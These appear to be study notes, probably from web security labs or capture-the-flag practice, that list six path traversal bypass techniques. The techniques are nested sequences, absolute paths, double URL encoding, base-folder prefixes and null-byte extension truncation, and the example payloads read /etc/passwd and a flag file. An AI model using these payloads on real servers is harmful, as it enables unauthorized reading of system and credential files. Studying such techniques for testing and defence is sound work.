# 1. Reading arbitrary files via path traversal
If given var/www/html/images
- -> Step back to var/www/html/images../../../flag.txt
- -> Or var/www/html/images/../../../etc/passwd

# 2. Traversal blocked with absolute path bypass
If given var/www/images/?filename=a.jpg
- ->Use absolute path var/www/images/?filename=/etc/passwd

# 3. Traversal sequence stripped (bypass by nested traversal)
Use nested traversal, e.g."....//" when server block "../"
-  ->e.g. GET /image/?filename=....//....//....//etc/passwd

# 4. Traversal sequence stripped with URL decode (bypass by double URL encode)
URL encode or double URL encode for:
- URL path
- filename param in multipart/form-data request

# 5. Start-of-path validation
An application may require the user-supplied filename to start with the expected base folder, such as "/var/www/images"
- -> Include that path in parameter

# 6. File extension validation
Bypass with null byte "%00" to terminate filepath before extension. Example: filename%00.png
